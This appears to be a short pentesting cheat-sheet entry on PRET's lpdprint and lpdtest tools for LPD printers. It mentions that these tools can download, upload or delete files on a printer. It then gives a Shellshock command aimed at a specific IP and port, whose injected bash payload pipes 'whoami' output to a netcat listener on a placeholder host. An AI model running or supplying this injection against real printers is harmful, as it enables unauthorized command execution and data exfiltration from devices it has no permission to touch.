## Tools for Interacting with LPD Printers

PRET introduces two essential tools, lpdprint and lpdtest, offering a straightforward method to interact with LPD-compatible printers. These tools enable a range of actions from printing data to manipulating files on the printer, such as downloading, uploading, or deleting

## Shellshock

python3 lpdtest.py 94.237.49.212 --port 44661 in '() {:;}; echo `whoami` | nc ip port'